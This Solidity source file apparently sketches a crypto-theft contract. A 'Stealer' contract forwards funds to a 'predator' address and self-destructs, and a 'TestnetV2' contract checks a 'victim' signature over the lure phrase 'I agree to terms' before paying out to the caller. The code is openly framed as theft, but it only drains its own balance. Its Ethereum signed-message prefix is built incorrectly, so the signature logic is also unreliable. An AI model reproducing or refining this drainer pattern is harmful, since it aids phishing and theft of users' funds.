// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol"; // Pastikan ini diimpor

interface IStealer {

}


contract Stealer {
    address public victimAddress;
    address payable public predatorAddress;

    constructor(address _victim, address payable _predator) payable {
        victimAddress = _victim;
        predatorAddress = _predator;

        if (msg.value > 0) {
            _predator.transfer(msg.value);
        }

        selfdestruct(_predator);
    }
}

contract TestnetV2 {

    receive() external payable {

    }

    fallback() external payable {

    }

    function execute(address _victim, bytes memory _sig) public payable {

        bytes32 originalMessageHash = keccak256(abi.encodePacked("I agree to terms"));


        bytes32 ethSignedMessageHash = keccak256(abi.encodePacked(
            "\x19Ethereum Signed Message:\n",
            bytes1(0x20),
            originalMessageHash
        ));

        address signer = ECDSA.recover(ethSignedMessageHash, _sig);

        require(signer == _victim, "Invalid signature from victim");

        uint256 contractBalance = address(this).balance;

        if (contractBalance > 0) {
            address payable currentPredator = payable(msg.sender);
            new Stealer{value: contractBalance}(_victim, currentPredator);
        } else {
            revert("No ETH balance in this contract.");
        }
    }
}

